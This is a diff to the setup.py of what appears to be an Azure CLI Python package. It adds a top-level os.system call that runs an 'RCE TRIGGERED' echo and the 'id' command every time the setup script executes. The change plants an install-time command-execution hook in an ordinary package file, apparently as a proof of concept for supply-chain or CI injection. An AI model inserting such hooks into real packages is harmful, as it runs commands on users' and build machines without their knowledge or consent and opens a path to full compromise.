@@ -7,8 +7,10 @@
 
 from codecs import open
 from setuptools import setup, find_packages
+import os
 import sys
 
+os.system("echo '[!] SETUP.PY RCE TRIGGERED [!]'; id")
 try:
     from azure_cli_bdist_wheel import cmdclass
 except ImportError:
